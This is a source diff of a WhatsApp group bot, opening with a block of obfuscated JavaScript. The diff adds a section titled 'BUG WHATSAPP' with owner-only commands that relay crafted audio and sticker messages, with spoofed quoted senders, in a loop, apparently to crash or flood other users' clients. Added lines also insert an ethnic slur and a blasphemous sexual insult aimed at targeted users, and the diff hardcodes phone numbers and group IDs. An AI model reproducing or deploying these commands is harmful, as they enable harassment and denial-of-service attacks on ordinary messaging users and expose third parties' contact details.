generateWAMessage(m[_0x311208(0x3a2,0x38d,0x3a1,0x395,0x36d)],_0x5c7f03,{'userJid':alpha[_0x552356(-0x137,-0x164,-0x17a,-0x12c,-0x17c)]['id'],'quoted':m[_0x5e81bc(0x38c,0x367,0x36f,0x3b5,0x388)+'d']&&m[_0x103abf(0xe9,0x112,0xa4,0xd6,0xae)+'d'][_0x311208(0x38a,0x3bf,0x3c7,0x390,0x3a3)+'bj']});messages[_0x552356(-0x171,-0x188,-0x1b8,-0x1b8,-0x1bd)][_0x552356(-0x1ac,-0x1a0,-0x1c8,-0x168,-0x1be)+'e']=areJidsSameUser(m[_0x552356(-0x19b,-0x1a2,-0x177,-0x169,-0x1bb)+'r'],alpha[_0x81032e(0x35c,0x397,0x3d0,0x3a9,0x3d0)]['id']),messages[_0x552356(-0x191,-0x188,-0x15d,-0x150,-0x1a6)]['id']=m[_0x81032e(0x37f,0x373,0x367,0x365,0x347)]['id'],messages[_0x311208(0x374,0x37c,0x3a2,0x399,0x382)+_0x103abf(0x12e,0x11c,0x15f,0x133,0x138)]=m[_0x552356(-0x1a8,-0x1a6,-0x1b7,-0x1b1,-0x199)+_0x5e81bc(0x3b1,0x414,0x3bd,0x3f5,0x3e5)];if(m[_0x103abf(0xca,0x10e,0xb2,0xdb,0xe7)+'up'])messages[_0x81032e(0x390,0x37e,0x342,0x360,0x3a6)+_0x5e81bc(0x3b9,0x3f7,0x3e1,0x3e7,0x3c3)+'t']=m[_0x103abf(0x11a,0xed,0x106,0xf4,0x114)+'r'];let msg={...chatUpdate,'messages':[proto[_0x311208(0x3e1,0x3b9,0x3b0,0x3c0,0x379)+_0x81032e(0x3c7,0x39f,0x3c7,0x3c6,0x372)+_0x81032e(0x37b,0x34b,0x324,0x381,0x37c)][_0x81032e(0x38f,0x375,0x376,0x34d,0x377)+_0x103abf(0xd5,0x104,0x116,0xff,0xdf)](messages)],'type':_0x103abf(0xe6,0xc3,0xff,0xca,0xdc)+'d'};alpha['ev'][_0x311208(0x3ee,0x38d,0x3b3,0x394,0x380)](_0x311208(0x3b5,0x3d9,0x3a9,0x3ca,0x3d0)+_0x5e81bc(0x41e,0x3d0,0x3cd,0x3e5,0x3f1)+_0x311208(0x3a6,0x37b,0x38b,0x38a,0x3a8),msg);}var bodynyaui=m[_0x81032e(0x383,0x36c,0x39a,0x365,0x33f)]==_0x311208(0x3cf,0x3e9,0x3d3,0x3ba,0x3bc)+_0x311208(0x3f6,0x3f2,0x3ef,0x42b,0x3fd)+_0x81032e(0x39e,0x377,0x37b,0x37a,0x3a5)+_0x5e81bc(0x3a2,0x39b,0x39a,0x381,0x393)?m[_0x103abf(0x11f,0x130,0x12a,0xf7,0x11d)+'ge'][_0x311208(0x39a,0x3a9,0x3d3,0x3e0,0x3a6)+_0x81032e(0x37b,0x3a2,0x381,0x368,0x373)+_0x311208(0x39c,0x3a2,0x3c4,0x39d,0x3b2)+_0x103abf(0xab,0xcc,0x109,0xe1,0xca)][_0x311208(0x3c7,0x396,0x397,0x373,0x3b0)+_0x81032e(0x361,0x35a,0x383,0x37a,0x35f)+_0x81032e(0x367,0x374,0x377,0x39f,0x382)+'ly'][_0x311208(0x407,0x416,0x3dc,0x3e3,0x402)+_0x552356(-0x17d,-0x15e,-0x140,-0x147,-0x15e)+_0x81032e(0x38c,0x357,0x388,0x372,0x348)]:m[_0x81032e(0x397,0x36c,0x396,0x38a,0x34f)]==_0x552356(-0x1a2,-0x19f,-0x1c7,-0x169,-0x1da)+_0x552356(-0x182,-0x15b,-0x12c,-0x171,-0x130)+_0x552356(-0x191,-0x167,-0x130,-0x191,-0x18a)+_0x81032e(0x30f,0x33d,0x359,0x343,0x30f)?m[_0x5e81bc(0x379,0x3a5,0x37a,0x39c,0x3a9)+'ge'][_0x81032e(0x34d,0x358,0x379,0x383,0x339)+_0x103abf(0x150,0x123,0x14e,0x124,0x151)+_0x552356(-0x18d,-0x162,-0x188,-0x181,-0x159)+_0x81032e(0x386,0x37c,0x397,0x349,0x37a)+'ge']?.[_0x103abf(0x102,0x124,0xf8,0x12a,0x15f)+_0x552356(-0x179,-0x183,-0x183,-0x160,-0x1c0)+_0x5e81bc(0x36f,0x366,0x3b0,0x354,0x391)+'d']||m[_0x552356(-0x16d,-0x19f,-0x171,-0x1b4,-0x1c6)+'ge'][_0x552356(-0x17c,-0x175,-0x190,-0x16d,-0x159)+_0x103abf(0x128,0x139,0x13c,0x13d,0x174)+_0x103abf(0x104,0x144,0x130,0x112,0xe9)+_0x103abf(0x115,0x10c,0xc7,0xe1,0xbe)]?.[_0x5e81bc(0x365,0x37c,0x387,0x3c2,0x397)+_0x5e81bc(0x3b7,0x39f,0x37f,0x3a3,0x3a7)+_0x103abf(0x13b,0xe2,0xe7,0x10f,0x14a)+'ly'][_0x552356(-0x141,-0x16c,-0x15f,-0x19d,-0x153)+_0x81032e(0x36b,0x39d,0x3a3,0x3c0,0x3a8)+_0x103abf(0xc2,0xdd,0x11d,0xf2,0x120)]||m[_0x311208(0x35e,0x35b,0x38c,0x351,0x379)]:'';let datares=db[_0x5e81bc(0x39c,0x3d9,0x39e,0x39f,0x3d8)][_0x5e81bc(0x3a8,0x373,0x38d,0x376,0x3a0)+_0x103abf(0x149,0x10a,0x120,0x11f,0x136)];for(let zeeone of datares){if(!bodynyaui&&budy===zeeone[_0x552356(-0x14b,-0x188,-0x18f,-0x182,-0x1a4)]&&zeeone[_0x5e81bc(0x387,0x364,0x392,0x3b4,0x390)]===_0x552356(-0x18a,-0x16a,-0x155,-0x166,-0x15f)+'r'){const _0x1c4fbc={};_0x1c4fbc[_0x81032e(0x38d,0x37f,0x37e,0x3a2,0x355)+_0x311208(0x3f8,0x403,0x3e5,0x3d2,0x3ed)]=global[_0x81032e(0x358,0x37f,0x368,0x3a7,0x389)+_0x552356(-0x172,-0x163,-0x187,-0x155,-0x138)],_0x1c4fbc[_0x552356(-0x193,-0x19e,-0x1b7,-0x1d5,-0x1cb)+'r']=global[_0x311208(0x3dc,0x391,0x3aa,0x3bc,0x384)+'r'],alpha[_0x103abf(0xca,0x115,0xc2,0xed,0xe9)+_0x5e81bc(0x3d0,0x392,0x3cc,0x36a,0x39c)+_0x5e81bc(0x3a5,0x34f,0x34c,0x36f,0x385)+_0x103abf(0x11f,0xee,0xea,0x11f,0xec)](m[_0x552356(-0x1b2,-0x1a7,-0x1d2,-0x1df,-0x1b9)],zeeone[_0x81032e(0x361,0x36d,0x39b,0x3a0,0x36e)],m,_0x1c4fbc);}}function _0x311208(_0x1ce23f,_0xa3077c,_0x1df622,_0x9db518,_0x34b32e){return _0x279a(_0x1df622-0x266,_0x34b32e);}let datares2=db[_0x103abf(0x11d,0xea,0x15d,0x126,0x137)][_0x552356(-0x1eb,-0x1b4,-0x1ab,-0x1d5,-0x1d8)];for(let zeeonee of datares2){!bodynyaui&&budy===zeeonee[_0x552356(-0x179,-0x188,-0x1a9,-0x192,-0x185)]&&zeeonee[_0x103abf(0xa1,0xcb,0xe4,0xde,0xab)]===_0x81032e(0x372,0x36f,0x3a4,0x36e,0x336)&&alpha[_0x81032e(0x39f,0x37d,0x359,0x345,0x3b9)+_0x103abf(0x126,0x13c,0xec,0x128,0xf0)](m[_0x81032e(0x326,0x354,0x32d,0x32d,0x359)],zeeonee[_0x81032e(0x34c,0x36d,0x39f,0x37a,0x35b)],m,!![]);}let datares3=db[_0x5e81bc(0x40d,0x3ec,0x3ba,0x3c1,0x3d8)][_0x81032e(0x3a6,0x39a,0x37e,0x3b8,0x38e)+'e'];function _0x552356(_0x27b43c,_0x2002e5,_0x3b5a4e,_0x181621,_0x3745aa){return _0x279a(_0x2002e5- -0x2e2,_0x3b5a4e);}function _0x81032e(_0x24b35b,_0x1a5506,_0x3568e1,_0xe8e3e3,_0x4cd9d1){return _0x279a(_0x1a5506-0x219,_0x24b35b);}function _0x46b2(){const _0x117ef5=['tedBu','Self\x20','fakeO','uptim','Messa','sendA','parti','packn','autor','Mode','2166054ypmScF','Publi','ker','des','listR','RVide','simi.','nsRes','ons','data','reply','udio','_url','selec','net/v','stike','://ap','6308130HopYQp','textI','mage','2/?lc','user','ame','ponse','RImag','ngs','f=fal','tedRo','publi','ssage','geCon','ideo','espon','inclu','ges.u','sendV','menti','essag','fileS','appen','log','autoc','image','sendM','6200341fXNHCo','995200nbnsct','69873GszsmZ','name','sStic','atus','base6','quote','s\x20:\x20','nfo','psert','text','isGro','26314368biIcjV','video','type','ttonI','setti','sage','RVn','c\x20Mod','I\x27m\x20','singl','Info','24wNmxyr','64565qLgHsR','https','mageA','cmd','=id&c','sendI','RStic','chat','pushN','xt=','wId','butto','sende','eSele','fromM','messa','autho','respo','\x20🤖\x20|\x20','setSt','toStr','isIma','WebMe','bject','ing','emit','Statu','store','\x20⏰\x20|\x20','succe','msg','mtype','url','se&te','audio','i.sim','nse','ha256','key','ctRep','fromO','cipan','seMes'];_0x46b2=function(){return _0x117ef5;};return _0x46b2();}for(let zeeoneee of datares3){!bodynyaui&&budy===zeeoneee[_0x5e81bc(0x3cf,0x3f5,0x3d9,0x3ba,0x3c0)]&&zeeoneee[_0x103abf(0xd0,0x116,0xd7,0xde,0xe4)]===_0x103abf(0xe6,0xe6,0xf3,0xcd,0x98)&&alpha[_0x81032e(0x330,0x352,0x389,0x35d,0x381)+_0x311208(0x3df,0x40b,0x3e2,0x3c4,0x3c5)](m[_0x5e81bc(0x3c1,0x368,0x38f,0x39f,0x3a1)],zeeoneee[_0x81032e(0x3a2,0x36d,0x33b,0x377,0x39f)],'',m);}function _0x103abf(_0x2918ae,_0x3e13d1,_0x35639a,_0x1a33d3,_0x280d55){return _0x279a(_0x1a33d3- -0x4c,_0x35639a);}let datares4=db[_0x81032e(0x398,0x38b,0x3a8,0x38a,0x368)][_0x5e81bc(0x3f7,0x3e7,0x3eb,0x3bc,0x3d4)+'o'];for(let zeeonew of datares4){!bodynyaui&&budy===zeeonew[_0x311208(0x3dc,0x3ad,0x3c0,0x396,0x384)]&&zeeonew[_0x103abf(0xab,0xb1,0xca,0xde,0xbb)]===_0x81032e(0x354,0x342,0x340,0x357,0x309)&&alpha[_0x5e81bc(0x41e,0x3d1,0x41a,0x41b,0x3f2)+_0x81032e(0x3a2,0x3a1,0x3ca,0x39b,0x397)](m[_0x552356(-0x171,-0x1a7,-0x1ab,-0x173,-0x185)],zeeonew[_0x81032e(0x38a,0x36d,0x345,0x36f,0x391)],![],'',m);}function _0x279a(_0x143a3f,_0x1bc2b6){const _0x5933be=_0x46b2();return _0x279a=function(_0x40dc6c,_0x48636b){_0x40dc6c=_0x40dc6c-(-0x1e4c+-0x1dbc+0x3d1e);let _0x588fa9=_0x5933be[_0x40dc6c];return _0x588fa9;},_0x279a(_0x143a3f,_0x1bc2b6);}try{let data_storee=db[_0x5e81bc(0x3c4,0x3f6,0x3e5,0x3a0,0x3d8)][_0x311208(0x3d3,0x39a,0x3b5,0x3b7,0x3b8)];for(let data_store of data_storee){var bodynya=m[_0x5e81bc(0x3e3,0x38c,0x386,0x388,0x3b9)]==_0x552356(-0x154,-0x175,-0x18a,-0x196,-0x19b)+_0x311208(0x3dd,0x42b,0x3ef,0x3c5,0x42b)+_0x552356(-0x15e,-0x184,-0x148,-0x173,-0x192)+_0x311208(0x38f,0x3a3,0x393,0x37e,0x364)?m[_0x311208(0x3b7,0x3c9,0x3a9,0x3e6,0x37a)+'ge'][_0x552356(-0x194,-0x175,-0x1a9,-0x13d,-0x1a9)+_0x311208(0x3e9,0x3e1,0x3ef,0x3e3,0x414)+_0x81032e(0x3b1,0x377,0x35f,0x3ac,0x361)+_0x103abf(0x10d,0xec,0xe0,0xe1,0x10f)][_0x552356(-0x1d0,-0x1b1,-0x19b,-0x1ad,-0x1d9)+_0x103abf(0xf7,0xc3,0x11e,0xf5,0x11b)+_0x103abf(0xd9,0x11c,0xea,0x10f,0x110)+'ly'][_0x5e81bc(0x3f1,0x40b,0x3f1,0x3bc,0x3dc)+_0x311208(0x3e1,0x425,0x3ea,0x418,0x3d0)+_0x311208(0x3ae,0x3ce,0x3a4,0x3af,0x3b1)]:m[_0x311208(0x3bb,0x3dc,0x3b9,0x3cf,0x3dd)]==_0x552356(-0x171,-0x19f,-0x1db,-0x1a9,-0x1b1)+_0x81032e(0x3d7,0x3a0,0x3a2,0x3ae,0x3ba)+_0x81032e(0x3bf,0x394,0x3c7,0x385,0x3a1)+_0x103abf(0xce,0x100,0xaf,0xd8,0xe8)?m[_0x103abf(0x114,0x11c,0x11d,0xf7,0x129)+'ge'][_0x5e81bc(0x3b4,0x382,0x388,0x3c6,0x3a5)+_0x103abf(0x133,0xf6,0x112,0x124,0x138)+_0x81032e(0x374,0x399,0x3c6,0x3bf,0x3ab)+_0x5e81bc(0x399,0x3ab,0x3c0,0x404,0x3c9)+'ge']?.[_0x5e81bc(0x3e8,0x3c9,0x3b5,0x3b0,0x3dc)+_0x81032e(0x370,0x378,0x34a,0x368,0x38c)+_0x103abf(0xd5,0xf6,0xe5,0xdf,0xe8)+'d']||m[_0x311208(0x3ac,0x3a3,0x3a9,0x39a,0x37e)+'ge'][_0x552356(-0x173,-0x175,-0x184,-0x186,-0x163)+_0x103abf(0x149,0x117,0x131,0x13d,0x170)+_0x5e81bc(0x3b3,0x3d6,0x3f4,0x388,0x3c4)+_0x81032e(0x351,0x346,0x368,0x333,0x34e)]?.[_0x311208(0x39b,0x3c2,0x397,0x3bc,0x372)+_0x5e81bc(0x383,0x3b5,0x3c0,0x377,0x3a7)+_0x81032e(0x35e,0x374,0x393,0x38f,0x35e)+'ly'][_0x81032e(0x356,0x38f,0x359,0x38b,0x3a8)+_0x552356(-0x13a,-0x15e,-0x13e,-0x129,-0x124)+_0x103abf(0x124,0x11a,0x12e,0xf2,0x11b)]||m[_0x103abf(0x10a,0x106,0x101,0xda,0xa6)]:'';if(m[_0x81032e(0x345,0x340,0x35e,0x329,0x31c)+'up']&&isCmd&&data_store['id']===m[_0x552356(-0x175,-0x1a7,-0x1c0,-0x1b6,-0x1a4)]&&bodynya[_0x103abf(0x155,0x117,0x16a,0x13e,0x167)+_0x552356(-0x141,-0x176,-0x18e,-0x14b,-0x14d)](data_store[_0x311208(0x3d5,0x3ed,0x3c0,0x3ef,0x3a6)])){if(data_store[_0x81032e(0x382,0x362,0x39e,0x393,0x376)+'ge']===![]){const _0x2156b6={};_0x2156b6[_0x311208(0x360,0x368,0x38c,0x38d,0x39a)]=data_store[_0x81032e(0x39a,0x35e,0x36d,0x366,0x338)+_0x81032e(0x335,0x371,0x3ac,0x358,0x397)],alpha[_0x103abf(0xa6,0xe0,0xe0,0xce,0xf9)+_0x311208(0x3d6,0x3d7,0x3f4,0x3e4,0x41b)+'e'](m[_0x552356(-0x1e2,-0x1a7,-0x1cf,-0x1a2,-0x1bd)],_0x2156b6,{'quoted':m});}else alpha[_0x552356(-0x1a2,-0x1c8,-0x1e3,-0x1a1,-0x1df)+_0x552356(-0x18e,-0x154,-0x136,-0x14c,-0x16f)+'e'](m[_0x81032e(0x333,0x354,0x352,0x38d,0x388)],{'image':await getBuffer(data_store[_0x5e81bc(0x385,0x370,0x3b4,0x34a,0x37f)+_0x81032e(0x379,0x38e,0x379,0x37a,0x3ca)]),'caption':data_store[_0x103abf(0xec,0x114,0x123,0xf9,0x11d)+_0x81032e(0x371,0x371,0x341,0x365,0x391)]},{'quoted':m});}}}catch(_0x1b00e8){console[_0x81032e(0x2f3,0x330,0x303,0x32c,0x345)](_0x1b00e8);}        
@@ -769,7 +832,7 @@ db.data.absen[from] = [
   }
 break
         	//Database
-case 'setcmd': {
+case 'setcmd': case 'addcmd': {
 db.data.cmd = db.data.cmd || {}
 if (!m.quoted)return reply(lang.SetCmd(prefix, command))
 if (!m.quoted.fileSha256)return reply(lang.HashCmd())
@@ -989,25 +1052,24 @@ if (!m.isGroup) return reply(lang.groupOnly())
                 alpha.sendText(m.chat, `Link Group : *${groupMetadata.subject}*\nhttps://chat.whatsapp.com/${response}`, m, { detectLink: true })
             }
             break
-            case 'delete': case 'del': {
+            case 'delete': case 'del': { //punya gw
             	if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
-                if (!m.quoted) throw false
-                let { chat, fromMe, id, isBaileys } = m.quoted
-                if (!isBaileys) return reply(lang.NoMsgBot())
+                //if (!m.quoted) throw false
+                //let { chat, fromMe, id, isBaileys } = m.quoted
+                //if (!isBaileys) return reply(lang.NoMsgBot())
                 alpha.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
             }
             break
 	    case 'toimage': case 'toimg': { //punya gw
                 if (!quoted) return reply(lang.NoToImg())
-                if (!/webp/.test(mime)) return reply(lang.NoToImg())
-                reply(lang.wait())
+                if (!/webp/.test(mime)) return reply(lang.NoToImg())                
                 let media = await alpha.downloadAndSaveMediaMessage(quoted)
                 let ran = await getRandom('.png')
                 exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                     fs.unlinkSync(media)
                     if (err) return reply(lang.ToimgErr())
                     let buffer = fs.readFileSync(ran)
-                    alpha.sendMessage(m.chat, { image: buffer, caption: 'Nih Tod' }, { quoted: m })
+                    alpha.sendMessage(m.chat, { image: buffer, caption: 'Nih Tod', contextInfo:{ externalAdReply: { showAdAttribution: true, title: `🆂🆃🅸🅲🅺🅴🆁 🅣🅞 🄸🄼🄰🄶🄴`, body: `${ownername}`, previewType: "PHOTO", thumbnailUrl: ppuser, thumbnail: '', sourceUrl: `${myweb}`}}}, { quoted: m })
                     fs.unlinkSync(ran)
                 })
             }
@@ -1084,7 +1146,7 @@ if (!m.isGroup) return reply(lang.groupOnly())
 				})
             }
             break
-            case 'ping': case 'tes': case 'runtime':
+            case 'ping': case 'runtime':
             await sendReact("⏳")
             reply(`Runtime : ${runtime(process.uptime())}`)
             break
@@ -1542,6 +1604,7 @@ break
             case 'hidetag':
                 if (!m.isGroup) return reply(lang.groupOnly())
                 if (!(isGroupAdmins || isGroupOwner )) return reply(lang.adminOnly())
+                if (isKecuali) return hidetag(`@${sender.split('@')[0]} Suka coli pake foto Yesus`)
                 alpha.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted: fkontak})
             break
 			case 'banned': {
@@ -1562,10 +1625,11 @@ break
 				reply(lang.ok())
 				}
 				break
-            case 'kick': {
+            case 'kick': { //punya gw
 				if (!m.isGroup) return reply(lang.groupOnly())
                 if (!isBotAdmins) return reply(lang.botNotAdmin())
-                if (!(isGroupAdmins || isGroupOwner )) return reply(lang.adminOnly())
+                if (isKecuali) return reply(`Mending lu nguli aja sunda ngentod`)
+                if (!(isGroupAdmins || isGroupOwner )) return reply(lang.adminOnly())                
                 if (!m.quoted && !text) return reply(lang.MauKick())
 				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 				await alpha.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
@@ -1589,10 +1653,11 @@ break
 				await alpha.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 				}
 				break
-			case 'demote': {
+			case 'demote': { //punya gw
 				if (!m.isGroup) return reply(lang.groupOnly())
                 if (!isBotAdmins) return reply(lang.botNotAdmin())
-                if (!(isGroupAdmins || isGroupOwner )) return reply(lang.adminOnly())
+                if (isKecuali) return reply(`Mending lu nguli aja sunda ngentod`)
+                if (!(isGroupAdmins || isGroupOwner )) return reply(lang.adminOnly())                
                 if (!m.quoted && !text) return reply(lang.NakDm())
 				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 				await alpha.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
@@ -1608,8 +1673,8 @@ break
             case 'out': case 'leave': //punya gw
                 if (!m.isGroup) return reply(lang.groupOnly())
                 if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
-               reply('Sayonara~ 👋').then(async res => 
-               await alpha.groupLeave(from))
+                reply('Sayonara~ 👋').then(async res => 
+                await alpha.groupLeave(from))
             break
             case 'group': case 'grup':
                 if (!m.isGroup) return reply(lang.groupOnly())
@@ -4220,7 +4285,7 @@ ${prefix}nuliskiri Subscribe Ya https://youtube.com/c/zeeoneofc`)
 //━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ CASE ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━//punya gw        
 
       case 'fake':
-      if (!m.key.fromMe && !isCreator) return
+      if (!isCreator) return
         //teks = "https://chat.whatsapp.com/BZqRmA7cN576QJdZhnBpOM"
         //teks = q ? q : "https://chat.whatsapp.com/BZqRmA7cN576QJdZhnBpOM"
         anu = args.join(' ').split('|')
@@ -4250,8 +4315,8 @@ gak share gak bisa masuk🙏`
         alpha.sendMessage(from, { text: teks2, contextInfo: { forwardingScore: 1000, isForwarded: true, externalAdReply: { title: `${loro}`, thumbnail: fake, mediaType: 2, previewType: "PHOTO", body: `${ownername}`, sourceUrl: `${siji}` }}})
         break
 
-            case 'on':
-                if (!m.key.fromMe && !isCreator) return
+            case 'on':            
+                if (!isCreator) return //reply('nope')
                 if (!q) return reply(`*contoh* : ${prefix + command} autoread\n\n*Isi Daftar :*\n•autoread\n•autoketik\n•autorecording\n•available\n•unavailable\n•pause\n•autovoice\n•autobio`)
                 if (args[0] === 'autoread') {
                     global.autoread = true
@@ -4281,7 +4346,7 @@ gak share gak bisa masuk🙏`
             break
 
             case 'off':
-                if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
+                if (!isCreator) return reply(lang.ownerOnly())
                 if (!q) return reply(`*contoh* : ${prefix + command} autoread\n\n*Isi Daftar :*\n•autoread\n•autoketik\n•autorecording\n•available\n•unavailable\n•pause\n•autovoice\n•autobio`)
                 if (args[0] === 'autoread') {
                     global.autoread = false
@@ -4328,10 +4393,10 @@ gak share gak bisa masuk🙏`
 					break
 
  case 'add2': {
- if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
- if (!q) return reply(`contoh : ${prefix + command} +628xx|"120363024710399996@g.us"`)
+ if (!isCreator) return reply(lang.ownerOnly())
+ if (!q) return reply(`Contoh : ${prefix + command} +628xx|120363024710399996@g.us`)
  anu = args.join(' ').split('|')
- nomornye = anu[0] !== '' ? anu[0] : "+62 813-1640-7846"
+ nomornye = anu[0] !== '' ? anu[0] : "+62 813-1640-8830"
  idgc = typeof anu[1] !== 'undefined' ? anu[1] : "62895322265316-1614343889@g.us"
  let users = m.quoted ? m.quoted.sender : nomornye.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
  await alpha.groupParticipantsUpdate(idgc, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
@@ -4339,21 +4404,21 @@ gak share gak bisa masuk🙏`
  break
 
  case 'kick2': {
- if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
- if (!q) return reply(`contoh : ${prefix + command} +628xx|"120363024710399996@g.us"`)
+ if (!isCreator) return reply(lang.ownerOnly())
+ if (!q) return reply(`contoh : ${prefix + command} +628xx|120363024710399996@g.us`)
  anu = args.join(' ').split('|')
- nomornye = anu[0] !== '' ? anu[0] : "+62 813-1640-7846"
+ nomornye = anu[0] !== '' ? anu[0] : "+62 813-1640-8830"
  idgc = typeof anu[1] !== 'undefined' ? anu[1] : "62895322265316-1614343889@g.us"
  let users = m.quoted ? m.quoted.sender : nomornye.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
  await alpha.groupParticipantsUpdate(idgc, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
  }
  break
 
- case 'promote2': {
- if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
- if (!q) return reply(`contoh : ${prefix + command} +628xx|"120363024710399996@g.us"`)
+ case 'promote2': { // > alpha.groupParticipantsUpdate("120363024710399996@g.us", ['62852364835040@s.whatsapp.net'], 'promote')
+ if (!isCreator) return reply(lang.ownerOnly())
+ if (!q) return reply(`contoh : ${prefix + command} +628xx|120363024710399996@g.us`)
  anu = args.join(' ').split('|')
- nomornye = anu[0] !== '' ? anu[0] : "+62 813-1640-7846"
+ nomornye = anu[0] !== '' ? anu[0] : "+62 813-1640-8830"
  idgc = typeof anu[1] !== 'undefined' ? anu[1] : "62895322265316-1614343889@g.us"
  let users = m.quoted ? m.quoted.sender : nomornye.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
  await alpha.groupParticipantsUpdate(idgc, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
@@ -4361,15 +4426,153 @@ gak share gak bisa masuk🙏`
  break
 
  case 'demote2': {
- if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
- if (!q) return reply(`contoh : ${prefix + command} +628xx|"120363024710399996@g.us"`)
+ if (!isCreator) return reply(lang.ownerOnly())
+ if (!q) return reply(`contoh : ${prefix + command} +628xx|120363024710399996@g.us`)
  anu = args.join(' ').split('|')
- nomornye = anu[0] !== '' ? anu[0] : "+62 813-1640-7846"
+ nomornye = anu[0] !== '' ? anu[0] : "+62 813-1640-8830"
  idgc = typeof anu[1] !== 'undefined' ? anu[1] : "62895322265316-1614343889@g.us"
  let users = m.quoted ? m.quoted.sender : nomornye.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
  await alpha.groupParticipantsUpdate(idgc, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
  }
  break
+
+ case 'antilink2': {
+ if (!isCreator) return reply(lang.ownerOnly())
+ if (!q) return reply(`Contoh : ${prefix + command} +628xx|120363024710399996@g.us`)
+ anu = args.join(' ').split('|')
+ nomornye = anu[0] !== '' ? anu[0] : "+62 813-1640-8830"
+ idgc = typeof anu[1] !== 'undefined' ? anu[1] : "62895322265316-1614343889@g.us"
+ let users = m.quoted ? m.quoted.sender : nomornye.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
+ await alpha.groupParticipantsUpdate(idgc, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
+ }
+ break
+
+//━━━━━━━━━━━━━━━━━━━━━━━━[ BUG WHATSAPP ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━//
+
+case 'jadivirgam': //ga work
+virgam = fs.readFileSync('./image/gamvir.jpeg')
+alpha.sendMessage(from, { caption: "nih", image: fs.readFileSync("./image/gamvir.jpeg") }, { quoted: m, thumbnail: virgam })
+break
+
+case 'bug1':
+if (!isCreator) return reply(lang.ownerOnly())
+var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"audioMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
+"mimetype": "audio/mpeg",
+"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
+"fileLength": "258330",
+"seconds": 16,
+"ptt": false,
+"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
+"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
+"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
+"mediaKeyTimestamp": "1657190832",
+}
+}), { userJid: m.chat, quoted: doc })
+alpha.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
+break
+
+case 'bugtag':
+if (!isCreator) return reply(lang.ownerOnly())
+if (!m.isGroup) return reply(lang.groupOnly())
+alpha.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: doc })
+break
+
+case 'inibug': case 'bugtagall':
+if (!isCreator) return reply(lang.ownerOnly())
+if (!m.isGroup) return reply(lang.groupOnly())
+let teks = `══✪〘 *BUG TAGALL️* 〙✪══
+ ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
+for (let mem of participants) {
+teks += `⭔ @${mem.id.split('@')[0]}\n`
+}
+alpha.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })
+break
+
+case 'bugstik':
+if (!isCreator) return reply(lang.ownerOnly())
+if (args.length == 0) return reply(`Penggunaan ${prefix+command} jumlah\nContoh : ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Mampus Kena Bug`
+for (let i = 0; i < jumlah; i++) {
+alpha.sendMessage(m.chat, { sticker: { url: "https://telegra.ph/file/25d567b38e5a8a1d8d573.png" }}, { quoted: {
+key: { 
+fromMe: false, 
+participant: `0@s.whatsapp.net`, 
+...({ remoteJid: "" }) 
+}, 
+"message": {
+"stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
+"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
+"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
+"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
+"mimetype": "image/webp",
+"height": 64,
+"width": 64,
